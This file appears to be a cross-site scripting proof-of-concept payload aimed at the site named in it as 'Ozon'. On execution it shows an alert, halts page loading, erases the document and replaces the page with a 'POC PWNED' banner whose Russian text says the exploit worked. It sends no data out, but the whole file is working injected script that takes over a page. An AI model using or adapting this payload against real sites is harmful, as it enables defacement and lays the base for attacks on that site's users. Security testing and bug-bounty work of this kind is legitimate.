alert('new_7');

(function() {
    window.stop();

    document.open();
    document.write(""); 
    document.close();

    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Ozon XSS</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            html, body { margin: 0; padding: 0; width: 100%; height: 100%; background: #2b2b2b !important; }
            .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; font-family: sans-serif; }
            h1 { color: #ff4444; margin-bottom: 10px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>POC PWNED</h1>
            <p>Эксплойт сработал</p>
        </div>
    </body>
    </html>`;

    document.documentElement.innerHTML = html;
    document.title = 'Ozon XSS';
})();

